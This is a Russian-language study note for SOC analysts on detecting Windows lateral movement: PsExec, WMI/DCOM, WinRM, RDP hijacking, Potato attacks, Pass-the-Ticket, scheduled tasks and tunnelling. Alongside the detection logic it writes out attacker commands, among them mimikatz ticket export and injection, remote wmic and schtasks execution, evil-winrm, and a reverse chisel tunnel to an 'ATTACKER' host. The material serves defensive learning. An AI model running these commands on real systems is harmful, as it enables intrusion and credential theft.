## 0. Общая модель: зачем LM и что видно защитнику

После первичного доступа (initial access) атакующий почти никогда не остаётся на первом хосте — там редко лежат ценные данные. Цель: дойти до DC, файлового сервера, базы данных или рабочей станции конкретного человека (CFO, разработчик с доступом к репо). Тактика в MITRE ATT&CK — **TA0008 Lateral Movement**.

**Любая техника LM = аутентификация + исполнение.** Меняется протокол (SMB/RDP/WMI/WinRM/SSH/DCOM), но последовательность всегда одна: сначала атакующий доказывает целевой машине, кто он (используя украденные/легитимные креды, хеш или тикет), затем что-то выполняет. Это и есть точка, где строится детект — искать не "плохой файл", а несоответствие в паре (кто аутентифицировался) × (откуда) × (когда) × (что сделал).

### Source vs Destination — модель с двух сторон
Каждое удалённое подключение оставляет два независимых набора артефактов:

| | Источник (source) | Назначение (destination) |
|---|---|---|
| Что видно | Какие креды использованы, какая цель выбрана (намерение) | Факт подключения, что выполнено в сессии (реализация) |
| Если смотреть только это | Известен умысел, неизвестно, удался ли | Известно, что атака произошла, неизвестно происхождение |
| Ключевые события | Sysmon EID 1 (запуск инструмента), EID 3 (исходящее соединение) | EID 4624/4648 (логон), специфичные для протокола (7045, 5140, 4104…) |

Хорошее расследование LM всегда двустороннее: находишь аномалию на destination → идёшь искать source по IP/hostname → подтверждаешь через Sysmon EID 1 на источнике.

### Logon Type — первое, что проверять
EID 4624 на destination содержит `Logon_Type`, который сразу сужает протокол:

| Logon Type | Значение | Типичные протоколы | Что это говорит |
|---|---|---|---|
| 2 | Interactive | локальная консоль | физический вход |
| 3 | Network | SMB, PsExec, WMI/DCOM (через RPC), большинство "тихих" LM | нет интерактивной сессии — самый частый и самый неоднозначный тип |
| 4 | Batch | Scheduled Task | задача выполнена по расписанию/удалённо |
| 5 | Service | запуск службы | часто следом за PsExec/sc.exe |
| 7 | Unlock/Reconnect | RDP-переподключение к уже существующей сессии | **см. предупреждение ниже** |
| 9 | NewCredentials | RunAs /netonly, Potato-атаки, impersonation | другой набор кредов внутри той же сессии |
| 10 | RemoteInteractive | RDP (полноценная новая сессия) | классический интерактивный удалённый рабочий стол |

> [!warning] Type 7 vs Type 10 в RDP
> Если атакующий подключается по RDP, а у той же учётки на хосте уже есть активная/отключённая сессия — Windows **переподключает** её вместо создания новой. Это даёт Type 7, а не Type 10. Фильтрация только по `Logon_Type=10` пропустит такие переподключения. Плюс при reconnect назначается новый `Logon_ID`, даже если сама RDP-сессия сохраняется — корреляция по LogonID может рваться на границе disconnect/reconnect.

Type 3 самый шумный: его дают и SMB, и PsExec, и WMI, и DCOM, и NLA-прелюдия перед RDP. Различать протоколы внутри Type 3 приходится по сопутствующим артефактам (см. разделы ниже) — сам EID 4624 недостаточен.

**Event 4648 (Logon with Explicit Credentials)** — фиксируется на **источнике**, когда пользователь явно указывает чужие креды (`net use /user:`, `runas`, ввод логина/пароля в RDP-окне). Показывает: кто был залогинен реально, какие креды подставил, к какому серверу шёл. **Не срабатывает** на Pass-the-Hash / Pass-the-Ticket / чистом Kerberos — там креды не вводятся явно, а повторно используются из памяти/кэша.

## 1. SMB Lateral Movement (T1021.002) — краткая сводка

Полный пошаговый разбор с реальными Splunk-запросами уже есть в [[Обнаружение Lateral Movement]] — не дублирую, только ключевые тезисы для связки с карточками.

- Административные шары по умолчанию: `C$` (корень диска), `ADMIN$` (`%SystemRoot%`), `IPC$` (именованные каналы для RPC). Обычные пользователи их не трогают — доступ к ним = либо админ на обслуживании, либо LM.
- Ключевые события: **EID 5140** (Share access, поля `Share_Name`, `Source_Address`, `user`, `host`) + **EID 4624** LogonType=3.
- Паттерн атаки: один source IP запрашивает `ADMIN$` на разных хостах за короткое время — сильный сигнал горизонтального сканирования, если это не типично для источника.
- Атрибуция source hostname по IP: искать EID 4624 с `user=*$` (компьютерные учётки в AD всегда оканчиваются на `$`) и этим `Source_Network_Address`.

## 2. PsExec (использует T1021.002 + T1569.002 Service Execution)

### Механика
PsExec (Sysinternals) сочетает доступ к `ADMIN$` с установкой Windows-службы для выполнения команд удалённо.

1. Аутентифицированная SMB-сессия (обычно уже есть через `net use`).
2. `PsExec.exe \\target cmd.exe` копирует служебный бинарник `PSEXESVC.exe` в `C:\Windows` на цели через `ADMIN$`.
3. Создаёт и запускает Windows-службу (**EID 7045** в журнале System на цели — "A new service was installed").
4. Служба поднимает именованные каналы (named pipes) для `stdin`/`stdout`/`stderr` — **Sysmon EID 17/18**.
5. Служба выполняет команду от имени указанного пользователя (или SYSTEM с флагом `-s`).
6. По завершении PsExec удаляет службу и бинарник — но **EID 7045 уже записан и не удаляется**.

### Почему это работает как обычный админский трафик
PsExec — легитимный инструмент, сисадмины гоняют его каждый день. С точки зрения протокола атака и легитимное использование неразличимы — разница только в контексте: какая учётка, с какого хоста, в какое время, к скольким целям.

### Детект
- **EID 7045** на цели: `Service_Name=PSEXESVC` (по умолчанию), `Service_File_Name=...\PSEXESVC.exe`, поле `Service_Account` — от чьего имени служба.
- Переименование: флаг `-r customname` меняет имя службы; Impacket `psexec.py`/Cobalt Strike psexec-модуль генерируют случайные имена. **EID 7045 всё равно срабатывает** — сигнатурный признак не имя, а сама связка `Service_Type=user mode service` + `Service_Start_Type=demand start`, появившаяся сразу после сетевого логона.
- Команды атакующего: Sysmon EID 1 с `ParentImage="*PSEXESVC*"` на целевом хосте.
- Источник: Sysmon EID 1 с `Image="*PsExec*"` — CommandLine покажет целевой хост и выполненные команды.

MITRE: T1569.002 (System Services: Service Execution), опирается на T1021.002 (SMB/Admin Shares) для доставки.

## 3. WMI Execution / DCOM (T1047 + T1021.003)

### Механика WMI
`wmic /node:TARGET process call create "cmd.exe /c payload"` или через PowerShell `Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe"`.

- Транспорт: DCOM поверх RPC — сначала endpoint mapper на **порту 135**, затем реальные данные на динамическом порту **49152+** (или фиксированном, если сконфигурирован).
- На цели запрос обрабатывает служба `WmiPrvSE.exe` (WMI Provider Host) — это она порождает реальный дочерний процесс (`cmd.exe`, `powershell.exe`).
- **Файл не копируется на диск** — только выполнение команды в памяти через WMI-интерфейс. Это делает WMI тише PsExec: нет `PSEXESVC.exe` на диске, нет EID 7045.

### Детект WMI
- **Sysmon EID 1**: `ParentImage=WmiPrvSE.exe` → любой дочерний процесс — это самый надёжный признак, легитимные скрипты администрирования тоже используют WMI, но родитель `WmiPrvSE.exe → shell` вне известных задач мониторинга подозрителен.
- **EID 4688** с `ParentProcessName=WmiPrvSE.exe`.
- **EID 4624** LogonType=3 непосредственно перед стартом WmiPrvSE-цепочки.
- Sysmon EID 3: соединение на 135, затем на динамический порт от `WmiPrvSE.exe` или от инициатора на источнике (`wmic.exe`/`powershell.exe` → 135).

### DCOM Lateral Movement — отдельная техника (T1021.003)
DCOM позволяет создавать и вызывать методы COM-объектов на удалённой машине без явного exec-API WMI. Классические объекты для абьюза:
- `MMC20.Application` → `ExecuteShellCommand`
- `ShellWindows` / `ShellBrowserWindow` → `Document.Application.ShellExecute`
- `Excel.Application` → `DDEInitiate` (запуск через DDE)

**Отличие от WMI**: DCOM-запуск обычно порождает дочерний процесс не от `WmiPrvSE.exe`, а от `mmc.exe`, `explorer.exe` или `excel.exe` — процессов, которые в норме никогда не запускают `cmd.exe`/`powershell.exe` удалённо. Именно нетипичная родительско-дочерняя связка — главный детект-сигнал, отдельного сервиса как у PsExec здесь нет, поэтому DCOM считается наименее заметной из "классических" техник LM.

**Детект DCOM**: Sysmon EID 1 — `mmc.exe`/`excel.exe`/`explorer.exe` как родитель для `cmd.exe`/`powershell.exe`, где нормальный родитель этих shell-процессов — `explorer.exe` при интерактивном запуске пользователем локально, а не при сетевом логоне. Sysmon EID 3: DCOM-порт 135 + динамика. EID 4624 LogonType=3 предшествует.

MITRE: T1047 (Windows Management Instrumentation) для WMI-исполнения, T1021.003 (Distributed Component Object Model) для DCOM.

## 4. WinRM / PowerShell Remoting (T1021.006)

*(Эта техника не была в оригинальном THM-разборе — но именно её чаще всего используют реальные админы и, соответственно, реальные атакующие, маскирующиеся под них: PowerShell Remoting — штатный инструмент управления Windows-фермами.)*

### Механика
```powershell
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; ipconfig }
Enter-PSSession -ComputerName TARGET
```
Или сторонний клиент `evil-winrm -i TARGET -u user -p pass` (популярен у атакующих — даёт интерактивную псевдо-shell сессию поверх WinRM).

- Протокол: WS-Management поверх HTTP (**5985**) или HTTPS (**5986**).
- На цели весь трафик обрабатывает `wsmprovhost.exe` (WinRM Provider Host) — аналог `WmiPrvSE.exe`, но для WinRM. Именно он — родитель для команд, выполняемых удалённо.
- Требования: пользователь должен быть в группе **Remote Management Users** или локальных администраторах; WinRM должен быть включён (`winrm quickconfig`) — по умолчанию включён на Server, выключен на клиентских Windows.
- Аутентификация: Kerberos или NTLM в зависимости от конфигурации (Negotiate).

### Почему это опасно для детекта
Из всех "классических" техник LM WinRM — самая близкая к штатному способу работы IT-отдела: PowerShell Remoting официально рекомендован Microsoft вместо PsExec. Нет файла на диске, нет новой службы, никакого специфичного EventID уровня "здесь была атака" — только `wsmprovhost.exe` и обычный сетевой логон.

### Детект
- **EID 4624** LogonType=3 с последующим появлением `wsmprovhost.exe` на цели (сам EventLog порт не пишет — сверять с firewall/NetFlow логами на 5985/5986).
- **Sysmon EID 1**: `wsmprovhost.exe` → `cmd.exe`/`powershell.exe` — родитель-ребёнок, аналогично WmiPrvSE для WMI.
- **PowerShell EID 4103** (Module Logging) и **EID 4104** (Script Block Logging) на цели фиксируют реально выполненный код, если логирование включено — критично для восстановления, что именно атакующий делал внутри сессии.
- Аномалия по baseline: WinRM между двумя рабочими станциями (не сервер↔РС и не IT-admin↔сервер) — нетипичный паттерн для большинства организаций.
- `evil-winrm` специфично: клиентская сторона логинится с нестандартным `User-Agent` в WS-Man заголовках (если есть видимость на прокси/NDR).

MITRE: T1021.006 (Windows Remote Management).

## 5. RDP Lateral Movement (T1021.001) + RDP Hijacking

### Обычный RDP
Полноценная интерактивная desktop-сессия. Основной артефакт — **EID 4624 LogonType=10** на цели (имя учётки, source IP, время). В отличие от SMB/PsExec (всегда Type=3), RDP сразу отличим — но есть нюанс с NLA (см. раздел 0, Type 7 vs Type 10).

**Норма vs подозрительно:**

| Паттерн | Типично? | Почему |
|---|---|---|
| РС → сервер | Да | IT-администраторы управляют серверами со своих рабочих станций |
| РС → РС | Редко | Обычные пользователи не ходят по RDP друг к другу; helpdesk — только с выделенных IT-машин |
| Сервер → сервер | Подозрительно | Серверы не инициируют исходящий RDP сами по себе — значит, кто-то уже внутри сессии на первом сервере и двигается дальше |

### RDP Chaining (Island Hopping через RDP)
Атакующий: скомпрометированная РС → RDP на сервер A → **внутри этой же RDP-сессии** открывает ещё одно RDP-подключение к DC под другой, более привилегированной учёткой. На каждом хопе — новый EID 4624 Type=10, но исходный внешний IP не меняется, потому что соединение идёт уже с промежуточной машины. Прослеживается через `Logon_ID`: берёшь LogonID сессии на цели → ищешь по нему исходящий `mstsc.exe` (Sysmon EID 1) на промежуточном хосте → тот в свою очередь имеет свой входящий LogonID → повторяешь.

### RDP Hijacking без пароля — tscon.exe (T1563.002)
`tscon.exe SESSIONID /dest:consoleSESSIONID` — встроенная утилита позволяет привилегированному (SYSTEM) процессу "переключиться" на чужую отключённую RDP-сессию **без ввода пароля**. Атакующему с правами SYSTEM (например, после PsExec с `-s`) достаточно узнать ID отключённой сессии администратора (`query user`) и выполнить `tscon`. Детект: **EID 4778** (сессия переподключена) / **EID 4779** (отключена) в связке с процессом `tscon.exe`, запущенным от SYSTEM — обычные пользователи `tscon.exe` не вызывают.

### RDP Restricted Admin Mode — Pass-the-Hash для RDP
`mstsc.exe /restrictedAdmin` — подключение без передачи пароля в открытом виде, аутентификация NTLM-хешем/Kerberos-тикетом, креды не кэшируются в LSASS цели. По умолчанию выключен с Server 2012 R2 (включается реестром `DisableRestrictedAdmin=0`). Детект: несоответствие — **RDP-подключение (порт 3389), но LogonType=3, а не ожидаемый 10** — прямой сигнал restricted admin / PtH-подобной техники.

MITRE: T1021.001 (RDP), T1563.002 (Remote Service Session Hijacking: RDP Hijacking).

## 6. Token Impersonation & Potato Attacks (T1134)

### Суть
Windows-токен — представление прав пользователя/процесса. Если процесс обладает `SeImpersonatePrivilege` или `SeAssignPrimaryTokenPrivilege` (по умолчанию есть у служебных учёток: IIS AppPool/Network Service, MSSQL Server, любая служба под `LOCAL SERVICE`/`NETWORK SERVICE`), он может **украсть токен другого процесса и действовать от его имени** — без знания пароля.

### Potato-атаки — как именно крадут токен SYSTEM
Стандартный сценарий: атакующий уже выполняет код от имени низкопривилегированной служебной учётки (например, после эксплуатации веб-шелла под IIS) и хочет SYSTEM.

1. Инструмент (PrintSpoofer / RoguePotato / JuicyPotato) поднимает локальный named pipe.
2. Принудительно заставляет системный сервис (Print Spooler через `RpcOpenPrinter`/`RpcRemoteFindFirstPrinterChangeNotification`, или DCOM-активацию произвольного CLSID с повышенными правами, или BITS) подключиться к этому named pipe как SYSTEM.
3. Инструмент перехватывает токен подключившегося сервиса (`ImpersonateNamedPipeClient`) — теперь у атакующего токен SYSTEM.
4. С токеном SYSTEM запускается новый процесс (`CreateProcessWithTokenW`) — например, PsExec или WMI-команда для перехода на следующий хост уже с максимальными правами.

Разные утилиты используют разный триггер: **PrintSpoofer** — сервис очереди печати (Spooler), **RoguePotato** — исходящий NTLM-relay через произвольный внешний листенер (обходит фикс, который Microsoft внёс против JuicyPotato), **JuicyPotato** — DCOM-активация конкретных CLSID.

### Детект
- **Sysmon EID 17/18** (Named Pipe Created/Connected): создание нестандартного pipe и подключение к нему системного сервиса (`spoolsv.exe`, DCOM-хост).
- **Sysmon EID 1**: запуск `PrintSpoofer.exe`/`JuicyPotato.exe`/`RoguePotato.exe` (в т.ч. переименованных — сигнатура поведения важнее имени файла).
- **EID 4624 LogonType=9** (NewCredentials) сразу вслед за подозрительным процессом.
- Ключевая аномалия: `w3wp.exe` (IIS worker) или `sqlservr.exe` порождают дочерний процесс с integrity level **System** — веб-сервер/СУБД в норме никогда не должны запускать процессы с SYSTEM-правами.

Почему это раздел про LM, а не только про PE: полученный SYSTEM-токен — это не финал атаки, а трамплин: с ним запускают PsExec/WMI/WinRM на следующий хост уже без ограничений локальной учётки.

MITRE: T1134 (Access Token Manipulation), конкретно T1134.001 (Token Impersonation/Theft).

## 7. Pass-the-Ticket для Lateral Movement (T1550.003)

### Механика
В отличие от Pass-the-Hash (NTLM), здесь крадётся и переиспользуется Kerberos-тикет (TGT или TGS) из памяти LSASS.

1. Экспорт тикетов: `mimikatz sekurlsa::tickets /export` или `Rubeus dump`.
2. Инъекция в текущую сессию: `mimikatz kerberos::ptt ticket.kirbi` — тикет загружается в память процесса атакующего.
3. Дальше — обычное использование: `klist` покажет загруженный тикет, `\\server\share`, `psexec.py` и т.д. работают как будто атакующий легитимно прошёл Kerberos.

Дополнительные инструменты:
- **Rubeus s4u** — запрос TGS от чужого имени через S4U2Self/S4U2Proxy (полезно при делегировании).
- **Impacket getST.py** — получение TGS напрямую, без интерактивного mimikatz.

### Отличие от простого использования Kerberos
Тикет краденый, значит — либо получен из чужого LSASS (требует локального admin/SYSTEM на исходном хосте), либо через DCSync/Golden Ticket. Ключевой признак для детекта — **несоответствие мест и времени**: тикет "появляется" на хосте, где соответствующей аутентификации через KDC не было.

### Детект
- Sysmon EID 10: доступ к `lsass.exe` на исходном хосте перед инъекцией (сам dump).
- **EID 4624 LogonType=9** — RunAs с другими кредами внутри сессии.
- Сеть/SIEM: TGS-REQ (**EID 4769**) на цели без предшествующего свежего TGT-запроса (**EID 4768**) с того же хоста — тикет не "вырос" на этой машине естественным путём.
- Временные метки: тикет создан раньше, чем пользователь реально залогинился на этом хосте (несоответствие таймлайна).
- Один и тот же TGT/учётка аутентифицируется с разных IP почти одновременно — тикет физически перемещён.

MITRE: T1550.003 (Use Alternate Authentication Material: Pass the Ticket).

## 8. Scheduled Tasks для Lateral Movement (T1053.005)

### Механика
```
schtasks /create /s TARGET /tn TaskName /tr "cmd /c payload" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s TARGET /tn TaskName
```
Требует уже имеющегося admin-доступа к цели (тот же admin-share/RPC, что и PsExec). Задача может быть запущена сразу (`/run`) или отложенно — что полезно и для LM, и как отдельный persistence-механизм на той же цели.

### Детект
- **EID 4698** на целевом хосте — "A scheduled task was created" (кто создал, имя задачи, команда).
- Sysmon EID 1: `taskeng.exe`/`svchost.exe` (Task Scheduler host) → payload как родитель.
- **EID 5140** — предшествующий SMB-доступ к `ADMIN$` (создание задачи удалённо идёт через RPC поверх той же SMB-сессии).
- Отличие "LM через задачу" от "просто persistence через задачу": в LM-сценарии задача создаётся **удалённо** (source ≠ target в EID 4698 через RPC-контекст) и обычно выполняется один раз (`/sc once`) сразу после создания — persistence-задачи чаще регулярные (`/sc daily`/`onlogon`) и создаются локально на самой машине.

MITRE: T1053.005 (Scheduled Task/Job: Scheduled Task).

## 9. Island Hopping — многохоповые цепочки

### Суть
"Island hopping" — не отдельная техника, а **паттерн использования** любой из вышеперечисленных техник цепочкой: атакующий → хост1 → хост2 → ... → DC. Каждый промежуточный хост — трамплин: аутентификация идёт уже с него, а не с исходной точки компрометации, поэтому финальная цель (например, DC) никогда не видит первоначальный внешний/атакующий IP напрямую.

### Почему это усложняет расследование
Если смотреть только на DC — видно подключение от "легитимного" внутреннего IP промежуточного сервера, и расследование упирается в вопрос "а кто был за этим сервером в тот момент". Нужно последовательно "разматывать" цепочку назад:

1. На цели (DC) — найти аномальный `Logon_ID` (например, из алерта на recon-команды: `nltest`, `net group`, запущенные на DC).
2. По этому `Logon_ID` в **EID 4624** узнать `Logon_Type` и `Source_Network_Address` — откуда реально пришло подключение.
3. Атрибутировать IP → hostname через **EID 4624** с `user=*$` на этом IP (компьютерные учётки).
4. На найденном промежуточном хосте искать исходящее подключение того же типа (Sysmon EID 1: `mstsc.exe`/`PsExec.exe`/`wsmprovhost.exe` в зависимости от протокола) с соответствующим `LogonId`.
5. Повторять шаги 1–4, пока не дойдёшь до первого скомпрометированного хоста (patient zero).

Каждый хоп может использовать **разный протокол** — RDP до сервера A, потом WMI с сервера A на сервер B, потом PsExec с B на DC — поэтому автоматическая корреляция в SIEM обычно строится не по протоколу, а по цепочке `(source_host, dest_host, timestamp)`, сшитой в граф.

MITRE: не отдельная техника, а связка нескольких T1021.x/T1047 подряд в рамках тактики TA0008.

## 10. Pivoting & Tunneling: Chisel, ligolo-ng и альтернативы (T1090, T1572)

### Зачем это нужно атакующему отдельно от LM-техник выше
Все техники выше требуют **прямой сетевой видимости** атакующего до цели (или хотя бы у промежуточного хоста). Если целевой сегмент недоступен напрямую (сегментация, firewall), нужен **туннель/пивот** — превратить скомпрометированный хост в промежуточный узел, через который трафик атакующего "проваливается" в закрытую сеть.

### Chisel
HTTP-based TCP-туннель (Go). `chisel server -p 8080 --reverse` на стороне атакующего, `chisel client ATTACKER:8080 R:socks` на жертве — обратное подключение поднимает SOCKS5-прокси на атакующей машине, трафик через который маршрутизируется в закрытую сеть жертвы. "Reverse" режим удобен, когда жертва может выйти наружу, а прямого входа снаружи нет (типичный NAT/firewall).

### ligolo-ng
Похожая идея, но реализована через TUN-интерфейс — создаёт полноценный виртуальный сетевой интерфейс на стороне атакующего, через который можно работать с закрытой сетью почти прозрачно (`nmap`, `ssh` и т.д. напрямую, без ручного проброса через SOCKS в каждом инструменте). Тоже reverse-туннель поверх обычного TCP/TLS.

### Другие инструменты того же класса (для полноты картины)
- **SSH-туннель** (`ssh -D`/`-L`/`-R`) — если на промежуточном хосте есть SSH-клиент/сервер, отдельный инструмент вообще не нужен (см. раздел SSH выше).
- **netsh interface portproxy** — встроенный в Windows статический port-forward, LOLBin-вариант без стороннего бинарника.
- **socat** — универсальный релей на Linux-хостах.
- **Cobalt Strike SOCKS pivot** — то же самое, но внутри штатного функционала C2-фреймворка.

### Детект
- Необычные исходящие соединения на нестандартные порты/протоколы (HTTP-туннель на непривычном порту, длительные keep-alive TCP-сессии).
- Sysmon EID 1: процесс `chisel.exe`/`ligolo-agent`/`socat` в командной строке.
- NetFlow/beaconing-анализ: постоянное, регулярное соединение хост→внешний IP с относительно стабильным объёмом — паттерн, похожий на C2-beacon, потому что это фактически тот же принцип (см. C2-детект в [[16 - Детект-карточки (атаки на всех уровнях)]]).
- На принимающей стороне (сервер атакующего вне сети) детект недоступен защитнику — весь упор на исходящий трафик изнутри периметра.

MITRE: T1090 (Proxy) для pivoting как категории, T1572 (Protocol Tunneling) для инкапсуляции трафика внутри другого протокола.

## 12. Общая стратегия детекта LM в SIEM (протокол-независимая)

Когда конкретный протокол неизвестен заранее (типичная ситуация — алерт "аномальная активность", а не "PsExec detected"), паттерны поиска одни и те же для любой техники выше:

1. **Fan-out** — один источник (хост/учётка) аутентифицируется на аномально большом числе целей за короткое окно: `stats count by user, dest_host | where count > threshold`.
2. **Off-hours** — активность конкретной учётки/хоста вне её обычного расписания (сравнение с историческим baseline по времени суток/дню недели).
3. **Peer-to-peer где не должно быть** — рабочая станция → рабочая станция. Норма почти везде — только сервер↔РС или IT-admin-РС↔сервер.
4. **Chain / Island hopping** — последовательность `Logon_ID`/`Logon_Type` хост1→хост2→хост3 в узком временном окне (см. раздел 9).
5. **First-seen** — источник впервые обращается к `ADMIN$`/`C$`/WinRM/SSH там, где раньше такого не было (UEBA/baseline-модель, не статичное правило).
6. **Explicit vs implicit creds** — EID 4648 (явные креды) есть → скорее легитимный `runas`/`net use`; EID 4648 отсутствует, а логон всё равно успешный привилегированной учёткой → возможен PtH/PtT (креды не вводились явно, значит переиспользованы).

Именно поэтому в реальном SOC уровня L1 связка "какой конкретно EventID" вторична — первична связка "кто, куда, когда, как часто, по сравнению с чем" — это и есть baseline/UEBA-мышление, которое на собеседовании ценится выше зазубренных номеров событий.

## 🧪 Тест для повторения

> [!question]- 1. В чём разница между Pass-the-Hash и Pass-the-Ticket с точки зрения детекта?
> PtH использует NTLM-хеш — EID 4624 LogonType=3 с AuthenticationPackageName=NTLM без предшествующего интерактивного входа. PtT использует Kerberos-тикет — детект через несоответствие EID 4769 (TGS) без свежего EID 4768 (TGT) с того же хоста, либо временные метки тикета раньше реального логона. Оба не оставляют EID 4648 (явные креды не вводились).

> [!question]- 2. Почему WMI и WinRM считаются "тише" PsExec?
> Оба не копируют бинарник на диск и не создают новую службу (нет EID 7045). Единственный надёжный признак — нетипичная родительско-дочерняя связка процессов: WmiPrvSE.exe → shell для WMI, wsmprovhost.exe → shell для WinRM. Без Sysmon (EID 1) с process-tree детект практически невозможен только по стандартному Windows EventLog.

> [!question]- 3. Как отличить легитимный RDP от RDP Restricted Admin (Pass-the-Hash по RDP)?
> Обычный RDP даёт EID 4624 LogonType=10. Restricted Admin Mode (mstsc /restrictedAdmin) даёт LogonType=3 при подключении по RDP-порту 3389 — несоответствие типа входа протоколу подключения выдаёт технику.

> [!question]- 4. Что общего у всех Potato-атак (JuicyPotato/PrintSpoofer/RoguePotato)?
> Все злоупотребляют SeImpersonatePrivilege служебной учётки, принуждая системный сервис аутентифицироваться на локальный named pipe атакующего, и крадут его токен (обычно SYSTEM). Различаются только тем, какой сервис используют как триггер (Spooler, DCOM, произвольный NTLM-relay).

> [!question]- 5. Почему Island Hopping усложняет атрибуцию на финальной цели (например, DC)?
> DC видит подключение только от последнего промежуточного хоста в цепочке, а не от исходного атакующего IP. Чтобы найти patient zero, нужно последовательно "разматывать" LogonID/Source_Network_Address назад через каждый хоп, атрибутируя IP→hostname по компьютерным учёткам (`user=*$`) на каждом шаге.

> [!question]- 6. Зачем атакующему Chisel/ligolo-ng, если уже есть PsExec/WMI/WinRM?
> Эти техники требуют прямой сетевой видимости до цели. Если сегмент закрыт (firewall/VLAN), нужен туннель — Chisel/ligolo-ng превращают скомпрометированный хост в pivot-точку (обычно reverse-соединение наружу), через который трафик атакующего проваливается в закрытую сеть, и уже оттуда применяются обычные LM-техники.

> [!question]- 7. Какой протокол-независимый признак LM самый надёжный при неизвестной технике атаки?
> Fan-out: один источник (хост/учётка) аутентифицируется на аномально большом числе целей за короткое временное окно — этот паттерн одинаков для SMB/RDP/WMI/WinRM/DCOM/SSH и не требует знания конкретного EventID протокола.
